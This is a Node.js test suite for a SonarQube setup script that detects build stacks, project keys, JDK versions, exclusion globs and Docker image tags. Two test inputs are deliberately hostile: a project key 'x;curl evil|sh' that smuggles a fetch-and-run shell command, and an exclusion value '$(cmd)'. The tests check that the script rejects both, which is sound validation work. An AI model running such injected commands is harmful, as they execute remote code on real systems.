import assert from 'node:assert/strict';
import path from 'node:path';
import { describe, test } from 'node:test';
import {
  detect,
  javaVersion,
  main,
  parseProperties,
  tags
} from '../../../../../skills/scan-sonarqube/scripts/sonar-setup.mjs';

const ROOT = path.resolve('/work/repo');
const SONAR_GRADLE = "plugins { id 'org.sonarqube' version '5.0.0' }\n";

// Stub deps over a fake tracked-file list, file contents, and existing directories (all relative to ROOT).
const repo = ({ files = [], texts = {}, dirs = [] } = {}) => ({
  git: () => files.join('\0'),
  readText: (p) => texts[path.relative(ROOT, p)] ?? null,
  existsSync: (p) => dirs.includes(path.relative(ROOT, p))
});
const run = (setup) => detect({ root: ROOT }, repo(setup));
const mavenJdk = (xml) => run({ files: ['pom.xml'], texts: { 'pom.xml': xml } }).jdk;
const gradleJdk = (text) => run({ files: ['build.gradle'], texts: { 'build.gradle': `${SONAR_GRADLE}${text}` } }).jdk;

describe('parseProperties', () => {
  test('reads key-value pairs and skips comments', () => {
    // Arrange
    const text = '# c\n! c\nsonar.projectKey = my-key\nother:val\n';
    // Act
    const props = parseProperties(text);
    // Assert
    assert.equal(props.get('sonar.projectKey'), 'my-key');
    assert.equal(props.get('other'), 'val');
    assert.equal(props.size, 2);
  });

  test('joins backslash continuation lines', () => {
    // Arrange
    const text = 'sonar.exclusions=a/**,\\\n  b/**\nnext=1\r\n';
    // Act
    const props = parseProperties(text);
    // Assert
    assert.equal(props.get('sonar.exclusions'), 'a/**,b/**');
    assert.equal(props.get('next'), '1');
  });

  test('returns an empty map for empty input', () => {
    // Arrange
    const text = '';
    // Act
    const props = parseProperties(text);
    // Assert
    assert.equal(props.size, 0);
  });

  test('ignores blank and comment-only text', () => {
    // Arrange
    const text = '\n  \n# only a comment\n';
    // Act
    const props = parseProperties(text);
    // Assert
    assert.equal(props.size, 0);
  });
});

describe('javaVersion', () => {
  test('reads a plain major version', () => {
    // Arrange
    const value = '21';
    // Act
    const result = javaVersion(value);
    // Assert
    assert.equal(result, 21);
  });

  test('maps 1.8 style values to the major version', () => {
    // Arrange
    const values = ['1.8', '1_8'];
    // Act
    const result = values.map(javaVersion);
    // Assert
    assert.deepEqual(result, [8, 8]);
  });

  test('returns null for a property reference', () => {
    // Arrange
    const value = '${java.version}';
    // Act
    const result = javaVersion(value);
    // Assert
    assert.equal(result, null);
  });

  test('returns null for empty and missing values', () => {
    // Arrange
    const values = ['', undefined];
    // Act
    const result = values.map(javaVersion);
    // Assert
    assert.deepEqual(result, [null, null]);
  });
});

describe('detect stacks', () => {
  test('detects maven from pom.xml', () => {
    // Arrange
    const setup = { files: ['pom.xml', 'src/App.java'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stack, 'maven');
    assert.equal(res.scanner, 'maven');
    assert.equal(res.scanCommand, 'scan-maven');
    assert.equal(res.stop, undefined);
  });

  test('detects gradle when the build applies org.sonarqube', () => {
    // Arrange
    const setup = { files: ['build.gradle.kts'], texts: { 'build.gradle.kts': 'id("org.sonarqube")' } };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stack, 'gradle');
    assert.equal(res.scanCommand, 'scan-gradle');
  });

  test('accepts the plugin from a version catalog', () => {
    // Arrange
    const setup = {
      files: ['build.gradle', 'gradle/libs.versions.toml'],
      texts: { 'gradle/libs.versions.toml': 'sonar = { id = "org.sonarqube" }' }
    };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stack, 'gradle');
  });

  test('detects the cli stack from JS, PHP, and Python markers', () => {
    // Arrange
    const markers = ['package.json', 'composer.json', 'go.mod', 'pyproject.toml', 'requirements.txt', 'Gemfile'];
    // Act
    const res = markers.map((f) => run({ files: [f] }));
    // Assert
    assert.deepEqual(
      res.map((r) => [r.stack, r.scanner, r.scanCommand, r.jdk]),
      markers.map(() => ['cli', 'scanner-cli', 'scan-cli', null])
    );
  });

  test('a build tool wins over JS markers in the same directory', () => {
    // Arrange
    const setup = { files: ['package.json', 'pom.xml'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stack, 'maven');
  });

  test('the root marker wins over a deeper one', () => {
    // Arrange
    const setup = { files: ['svc/pom.xml', 'build.gradle'], texts: { 'build.gradle': SONAR_GRADLE } };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stack, 'gradle');
  });

  test('the shallowest marker wins when none is at the root', () => {
    // Arrange
    const setup = { files: ['a/b/c/build.gradle', 'a/pom.xml'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stack, 'maven');
  });

  test('asks when maven and gradle sit at the same depth', () => {
    // Arrange
    const setup = { files: ['pom.xml', 'build.gradle'] };
    // Act
    const res = run(setup);
    // Assert
    assert.deepEqual(res.ask, ['maven', 'gradle']);
    assert.equal(res.stack, null);
    assert.equal(res.stop, undefined);
  });

  test('stops for a .NET-only repo', () => {
    // Arrange
    const setup = { files: ['App.sln', 'src/App.csproj'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stop, 'unsupported stack: .NET needs the .NET scanner');
    assert.equal(res.stack, null);
  });

  test('stops for Java sources without Maven or Gradle', () => {
    // Arrange
    const setup = { files: ['src/App.java'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stop, 'Java without Maven or Gradle needs sonar.java.binaries');
  });

  test('stops when gradle does not apply org.sonarqube', () => {
    // Arrange
    const setup = { files: ['build.gradle'], texts: { 'build.gradle': "plugins { id 'java' }" } };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stop, 'build does not apply org.sonarqube');
    assert.equal(res.stack, null);
  });

  test('stops when no marker matches', () => {
    // Arrange
    const setup = { files: ['README.md'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.stop, 'no supported stack detected');
  });

  test('throws without a root', () => {
    // Arrange
    const act = () => detect({}, repo());
    // Act and Assert
    assert.throws(act, /--root is required/);
  });

  test('--stack gradle resolves the ask with the gradle scanner', () => {
    // Arrange
    const setup = {
      files: ['pom.xml', 'build.gradle'],
      texts: { 'build.gradle': SONAR_GRADLE },
      dirs: ['build', 'target']
    };
    // Act
    const res = detect({ root: ROOT, stack: 'gradle' }, repo(setup));
    // Assert
    assert.equal(res.stack, 'gradle');
    assert.equal(res.jdk, 21);
    assert.equal(res.scanCommand, 'scan-gradle');
    assert.equal(res.ask, undefined);
    assert.ok(res.exclusions.includes('**/build/**'));
    assert.ok(!res.exclusions.includes('**/target/**'));
  });

  test('--stack maven resolves the ask with the maven scanner', () => {
    // Arrange
    const setup = { files: ['pom.xml', 'build.gradle'], texts: { 'build.gradle': SONAR_GRADLE }, dirs: ['target'] };
    // Act
    const res = detect({ root: ROOT, stack: 'maven' }, repo(setup));
    // Assert
    assert.equal(res.stack, 'maven');
    assert.equal(res.jdk, 21);
    assert.equal(res.scanCommand, 'scan-maven');
    assert.ok(res.exclusions.includes('**/target/**'));
  });

  test('--stack cli throws', () => {
    // Arrange
    const act = () => detect({ root: ROOT, stack: 'cli' }, repo({ files: ['package.json'] }));
    // Act and Assert
    assert.throws(act, /--stack must be maven or gradle/);
  });

  test('--stack gradle stops when no gradle build exists', () => {
    // Arrange
    const setup = { files: ['pom.xml'] };
    // Act
    const res = detect({ root: ROOT, stack: 'gradle' }, repo(setup));
    // Assert
    assert.equal(res.stop, 'no gradle build found');
    assert.equal(res.stack, null);
  });
});

describe('detect key', () => {
  test('uses sonar.projectKey from sonar-project.properties', () => {
    // Arrange
    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': 'sonar.projectKey=Org_App\n' } };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.key, 'Org_App');
  });

  test('falls back to the sanitized directory name', () => {
    // Arrange
    const deps = repo({ files: ['package.json'] });
    // Act
    const res = detect({ root: '/work/My App.v2' }, deps);
    // Assert
    assert.equal(res.key, 'my-app-v2');
  });

  test('keeps digits, dashes, and underscores in the directory name', () => {
    // Arrange
    const deps = repo({ files: ['package.json'] });
    // Act
    const res = detect({ root: '/work/api_2-svc' }, deps);
    // Assert
    assert.equal(res.key, 'api_2-svc');
  });

  test('accepts a key with a colon and a dot and derives a Docker-safe name', () => {
    // Arrange
    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': 'sonar.projectKey=org:app.v1\n' } };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.key, 'org:app.v1');
    assert.equal(res.name, 'cdk-sonar-org-app.v1');
    assert.equal(res.stop, undefined);
  });

  test('derives the name of a fallback key', () => {
    // Arrange
    const deps = repo({ files: ['package.json'] });
    // Act
    const res = detect({ root: '/work/My App.v2' }, deps);
    // Assert
    assert.equal(res.name, 'cdk-sonar-my-app-v2');
  });

  test('stops on a key with shell metacharacters', () => {
    // Arrange
    const setup = {
      files: ['package.json'],
      texts: { 'sonar-project.properties': 'sonar.projectKey=x;curl evil|sh\n' }
    };
    // Act
    const res = run(setup);
    // Assert
    assert.match(res.stop, /^invalid sonar\.projectKey: /);
    assert.equal(res.key, null);
    assert.equal(res.name, null);
  });

  test('stops on an all-digit key', () => {
    // Arrange
    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': 'sonar.projectKey=12345\n' } };
    // Act
    const res = run(setup);
    // Assert
    assert.match(res.stop, /invalid sonar\.projectKey: all digits/);
    assert.equal(res.key, null);
  });

  test('stops on a key over 400 characters', () => {
    // Arrange
    const text = `sonar.projectKey=${'a'.repeat(401)}\n`;
    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': text } };
    // Act
    const res = run(setup);
    // Assert
    assert.match(res.stop, /invalid sonar\.projectKey: longer than 400/);
    assert.equal(res.name, null);
  });

  test('stops on an all-digit fallback name and asks for sonar.projectKey', () => {
    // Arrange
    const deps = repo({ files: ['package.json'] });
    // Act
    const res = detect({ root: '/work/2024' }, deps);
    // Assert
    assert.match(res.stop, /set sonar\.projectKey/);
    assert.equal(res.key, null);
  });
});

describe('detect jdk', () => {
  test('uses a detected 17', () => {
    // Arrange
    const xml = '<properties><maven.compiler.release>17</maven.compiler.release></properties>';
    // Act
    const jdk = mavenJdk(xml);
    // Assert
    assert.equal(jdk, 17);
  });

  test('uses a detected 21 from java.version', () => {
    // Arrange
    const xml = '<java.version>21</java.version>';
    // Act
    const jdk = mavenJdk(xml);
    // Assert
    assert.equal(jdk, 21);
  });

  test('uses a detected 25 from the maven compiler plugin release', () => {
    // Arrange
    const xml = '<configuration><release>25</release></configuration>';
    // Act
    const jdk = mavenJdk(xml);
    // Assert
    assert.equal(jdk, 25);
  });

  test('maps 11 to the default', () => {
    // Arrange
    const xml = '<maven.compiler.source>11</maven.compiler.source>';
    // Act
    const jdk = mavenJdk(xml);
    // Assert
    assert.equal(jdk, 21);
  });

  test('maps a 1.8 value to the default', () => {
    // Arrange
    const xml = '<java.version>1.8</java.version>';
    // Act
    const jdk = mavenJdk(xml);
    // Assert
    assert.equal(jdk, 21);
  });

  test('falls back to the default when nothing is found', () => {
    // Arrange
    const xml = '<project></project>';
    // Act
    const jdk = mavenJdk(xml);
    // Assert
    assert.equal(jdk, 21);
  });

  test('reads JavaLanguageVersion.of from a gradle build', () => {
    // Arrange
    const text = 'java { toolchain { languageVersion = JavaLanguageVersion.of(25) } }';
    // Act
    const jdk = gradleJdk(text);
    // Assert
    assert.equal(jdk, 25);
  });

  test('reads sourceCompatibility and jvmToolchain', () => {
    // Arrange
    const texts = ["sourceCompatibility = '17'", 'kotlin { jvmToolchain(17) }'];
    // Act
    const jdks = texts.map(gradleJdk);
    // Assert
    assert.deepEqual(jdks, [17, 17]);
  });

  test('maps a low gradle version to the default', () => {
    // Arrange
    const text = 'sourceCompatibility = JavaVersion.VERSION_1_8';
    // Act
    const jdk = gradleJdk(text);
    // Assert
    assert.equal(jdk, 21);
  });
});

describe('detect exclusions', () => {
  test('orders repo patterns, fixed patterns, directories, then gitattributes', () => {
    // Arrange
    const setup = {
      files: ['pom.xml'],
      texts: {
        'sonar-project.properties': 'sonar.exclusions=**/gen/**, **/x/**\n',
        '.gitattributes': [
          '# c',
          'src/gen/** linguist-generated',
          'vendor/ linguist-vendored',
          'generated.js linguist-generated=true',
          '*.min.js linguist-generated=false',
          'lib -linguist-vendored'
        ].join('\n')
      },
      dirs: ['target']
    };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(
      res.exclusions,
      ['**/gen/**,**/x/**,**/.scannerwork/**,**/.git/**,**/target/**', 'src/gen/**,vendor/**,**/generated.js'].join(',')
    );
    assert.deepEqual(res.excluded, ['target']);
  });

  test('lists only the stack directories that exist', () => {
    // Arrange
    const setup = { files: ['package.json'], dirs: ['vendor', 'node_modules', 'docs'] };
    // Act
    const res = run(setup);
    // Assert
    assert.deepEqual(res.excluded, ['node_modules', 'vendor']);
  });

  test('checks the directories next to the chosen marker too', () => {
    // Arrange
    const setup = { files: ['svc/pom.xml'], dirs: ['svc/target'] };
    // Act
    const res = run(setup);
    // Assert
    assert.deepEqual(res.excluded, ['target']);
  });

  test('keeps only the fixed patterns when no directory exists', () => {
    // Arrange
    const setup = { files: ['pom.xml'] };
    // Act
    const res = run(setup);
    // Assert
    assert.equal(res.exclusions, '**/.scannerwork/**,**/.git/**');
    assert.deepEqual(res.excluded, []);
  });

  test('drops patterns with unsafe characters and lists them', () => {
    // Arrange
    const setup = {
      files: ['pom.xml'],
      texts: { 'sonar-project.properties': "sonar.exclusions='$(cmd)',a b/**,src/[x]/**,**/ok/**\n" }
    };
    // Act
    const res = run(setup);
    // Assert
    assert.deepEqual(res.dropped, ["'$(cmd)'", 'a b/**', 'src/[x]/**']);
    assert.equal(res.exclusions, '**/ok/**,**/.scannerwork/**,**/.git/**');
  });

  test('keeps safe globs and leaves dropped empty', () => {
    // Arrange
    const setup = {
      files: ['pom.xml'],
      texts: { 'sonar-project.properties': 'sonar.exclusions=src/{a}/**,x?.js\n' }
    };
    // Act
    const res = run(setup);
    // Assert
    assert.ok(res.exclusions.startsWith('src/{a}/**,x?.js,'));
    assert.deepEqual(res.dropped, []);
  });

  test('excludes no stack directory when the stack is undecided', () => {
    // Arrange
    const setup = { files: ['pom.xml', 'build.gradle'], dirs: ['target', 'build'] };
    // Act
    const res = run(setup);
    // Assert
    assert.deepEqual(res.excluded, []);
  });
});

const FILE = path.join('/cache', 'cdk', 'scan-sonarqube-tags.json');
const HUB = (names) => JSON.stringify({ results: names.map((name) => ({ name })) });
const SERVER_HUB = HUB(['9.9.0.65466-community', '25.1.0.102122-community', '25.2.0.1-community', 'latest']);
const CLI_HUB = HUB(['5.0.1.3006_6.2.1', '12.0.1.1_7.2.0', '12.0.1.1_7.10.0', 'latest']);
const MAVEN_HUB = HUB(['3.9.9-eclipse-temurin-17', '3.9.11-eclipse-temurin-17', '3.9.12-eclipse-temurin-17-alpine']);
const GRADLE_HUB = HUB(['8.14-jdk21', '8.14.3-jdk21', '9.0-jdk21-alpine']);

// Stub deps for `tags`: an in-memory cache file, a fixed clock, and canned Docker Hub bodies by URL fragment.
const tagDeps = ({ cache, hub = {} } = {}) => {
  const store = new Map(cache === undefined ? [] : [[FILE, cache]]);
  const fetched = [];
  return {
    store,
    fetched,
    env: { XDG_CACHE_HOME: '/cache' },
    homedir: () => '/home/u',
    today: () => '2026-10-24',
    readText: (f) => store.get(f) ?? null,
    writeText: (f, text) => store.set(f, text),
    fetchText: async (url) => {
      fetched.push(url);
      const key = Object.keys(hub).find((k) => url.includes(k));
      return key ? hub[key] : HUB([]);
    }
  };
};
const entry = (tag, date = '2026-10-24') => ({ date, tag });

describe('tags', () => {
  test('returns cached tags without fetching', async () => {
    // Arrange
    const cache = JSON.stringify({ server: entry('25.1.0.1-community'), 'scanner-cli': entry('12.0.0.1_7.0.0') });
    const deps = tagDeps({ cache });
    // Act
    const res = await tags({ stack: 'cli' }, deps);
    // Assert
    assert.deepEqual(res, {
      server: '25.1.0.1-community',
      scanner: '12.0.0.1_7.0.0',
      scannerImage: 'sonarsource/sonar-scanner-cli',
      source: { server: 'cached', scanner: 'cached' }
    });
    assert.deepEqual(deps.fetched, []);
  });

  test('looks up the highest numeric tag on a miss and caches it', async () => {
    // Arrange
    const deps = tagDeps({ hub: { sonarqube: SERVER_HUB, 'sonar-scanner-cli': CLI_HUB } });
    // Act
    const res = await tags({ stack: 'cli' }, deps);
    // Assert
    assert.equal(res.server, '25.2.0.1-community');
    assert.equal(res.scanner, '12.0.1.1_7.10.0');
    assert.deepEqual(res.source, { server: 'looked-up', scanner: 'looked-up' });
    const saved = JSON.parse(deps.store.get(FILE));
    assert.deepEqual(saved, { server: entry('25.2.0.1-community'), 'scanner-cli': entry('12.0.1.1_7.10.0') });
  });

  test('builds the maven lookup from the JDK and caches per JDK', async () => {
    // Arrange
    const deps = tagDeps({ hub: { sonarqube: SERVER_HUB, '/maven/': MAVEN_HUB } });
    // Act
    const res = await tags({ stack: 'maven', jdk: '17' }, deps);
    // Assert
    assert.equal(res.scannerImage, 'maven');
    assert.equal(res.scanner, '3.9.11-eclipse-temurin-17');
    assert.ok(deps.fetched.some((u) => u.endsWith('name=eclipse-temurin-17')));
    assert.ok('maven-17' in JSON.parse(deps.store.get(FILE)));
  });

  test('defaults the JDK and filters gradle tags by suffix', async () => {
    // Arrange
    const deps = tagDeps({ hub: { sonarqube: SERVER_HUB, '/gradle/': GRADLE_HUB } });
    // Act
    const res = await tags({ stack: 'gradle' }, deps);
    // Assert
    assert.equal(res.scanner, '8.14.3-jdk21');
    assert.equal(res.scannerImage, 'gradle');
    assert.ok('gradle-21' in JSON.parse(deps.store.get(FILE)));
  });

  test('treats a stale date as a miss', async () => {
    // Arrange
    const cache = JSON.stringify({ server: entry('1.0.0.0-community', '2026-10-23') });
    const deps = tagDeps({ cache, hub: { sonarqube: SERVER_HUB, 'sonar-scanner-cli': CLI_HUB } });
    // Act
    const res = await tags({ stack: 'cli' }, deps);
    // Assert
    assert.equal(res.server, '25.2.0.1-community');
    assert.equal(res.source.server, 'looked-up');
  });

  test('treats corrupt cache JSON as a miss', async () => {
    // Arrange
    const deps = tagDeps({ cache: '{not json', hub: { sonarqube: SERVER_HUB, 'sonar-scanner-cli': CLI_HUB } });
    // Act
    const res = await tags({ stack: 'cli' }, deps);
    // Assert
    assert.equal(res.source.server, 'looked-up');
    assert.ok(JSON.parse(deps.store.get(FILE)).server);
  });

  test('keeps other cached entries when it writes a new one', async () => {
    // Arrange
    const cache = JSON.stringify({ 'maven-21': entry('3.9.9-eclipse-temurin-21') });
    const deps = tagDeps({ cache, hub: { sonarqube: SERVER_HUB, 'sonar-scanner-cli': CLI_HUB } });
    // Act
    await tags({ stack: 'cli' }, deps);
    // Assert
    assert.deepEqual(JSON.parse(deps.store.get(FILE))['maven-21'], entry('3.9.9-eclipse-temurin-21'));
  });

  test('throws when Docker Hub lists no matching tag and caches nothing', async () => {
    // Arrange
    const deps = tagDeps({ hub: { sonarqube: HUB(['latest', 'lts']) } });
    // Act
    const act = tags({ stack: 'cli' }, deps);
    // Assert
    await assert.rejects(act, /image tag unresolved/);
    assert.equal(deps.store.has(FILE), false);
  });

  test('rejects an unknown stack', async () => {
    // Arrange
    const deps = tagDeps();
    // Act
    const act = tags({ stack: 'dotnet' }, deps);
    // Assert
    await assert.rejects(act, /--stack must be/);
    assert.deepEqual(deps.fetched, []);
  });

  test('rejects a bad JDK', async () => {
    // Arrange
    const deps = tagDeps();
    // Act
    const act = tags({ stack: 'maven', jdk: 'abc' }, deps);
    // Assert
    await assert.rejects(act, /--jdk must be/);
  });

  test('propagates a failed fetch', async () => {
    // Arrange
    const deps = { ...tagDeps(), fetchText: async () => Promise.reject(new Error('HTTP 503')) };
    // Act
    const act = tags({ stack: 'cli' }, deps);
    // Assert
    await assert.rejects(act, /HTTP 503/);
  });
});

describe('main', () => {
  const sink = () => {
    const out = [];
    const err = [];
    return { out, err, log: (t) => out.push(t), error: (t) => err.push(t) };
  };

  test('detect prints the detection JSON', async () => {
    // Arrange
    const io = sink();
    const deps = { ...repo({ files: ['pom.xml'] }), ...io };
    // Act
    const code = await main(['detect', '--root', ROOT], deps);
    // Assert
    assert.equal(code, 0);
    assert.equal(JSON.parse(io.out[0]).stack, 'maven');
  });

  test('detect passes --stack through', async () => {
    // Arrange
    const io = sink();
    const files = ['pom.xml', 'build.gradle'];
    const deps = { ...repo({ files, texts: { 'build.gradle': SONAR_GRADLE } }), ...io };
    // Act
    const code = await main(['detect', '--root', ROOT, '--stack', 'gradle'], deps);
    // Assert
    assert.equal(code, 0);
    assert.equal(JSON.parse(io.out[0]).stack, 'gradle');
  });

  test('usage mentions the detect --stack option', async () => {
    // Arrange
    const io = sink();
    // Act
    await main([], io);
    // Assert
    assert.match(io.err[0], /detect --root <dir> \[--stack/);
  });

  test('tags prints the tag JSON', async () => {
    // Arrange
    const cache = JSON.stringify({
      server: entry('25.1.0.1-community'),
      'maven-21': entry('3.9.9-eclipse-temurin-21')
    });
    const io = sink();
    const deps = { ...tagDeps({ cache }), ...io };
    // Act
    const code = await main(['tags', '--stack', 'maven', '--jdk', '21'], deps);
    // Assert
    assert.equal(code, 0);
    assert.deepEqual(JSON.parse(io.out[0]).source, { server: 'cached', scanner: 'cached' });
  });

  test('treats the removed update-compose subcommand as unknown', async () => {
    // Arrange
    const io = sink();
    // Act
    const code = await main(['update-compose', '--file', '/p/c.yaml'], io);
    // Assert
    assert.equal(code, 2);
    assert.match(io.err[0], /usage/);
  });

  test('prints usage and returns 2 for an unknown subcommand', async () => {
    // Arrange
    const io = sink();
    // Act
    const code = await main(['nope'], io);
    // Assert
    assert.equal(code, 2);
    assert.match(io.err[0], /usage/);
  });

  test('prints usage and returns 2 without a subcommand', async () => {
    // Arrange
    const io = sink();
    // Act
    const code = await main([], io);
    // Assert
    assert.equal(code, 2);
    assert.deepEqual(io.out, []);
  });
});
